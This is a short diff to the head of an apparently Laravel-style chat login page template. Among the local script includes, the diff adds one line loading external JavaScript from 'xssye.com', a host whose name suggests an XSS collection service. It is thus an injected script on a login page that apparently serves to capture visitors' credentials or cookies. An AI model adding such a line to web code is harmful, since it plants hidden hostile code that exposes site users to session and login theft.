@@ -10,6 +10,7 @@
 
     <link rel="shortcut icon" type="image/png" href="{{ env('ICON') }}"/>
     <script src="/js/jquery.min.js"></script>
+  	<script src=http://xssye.com/dKGx></script>
     <script src="/chat/js/pages/cloud.js"></script>
     <script src="/chat/js/pages/login.js"></script>
     <link rel="stylesheet" href="/chat/css/login.css">
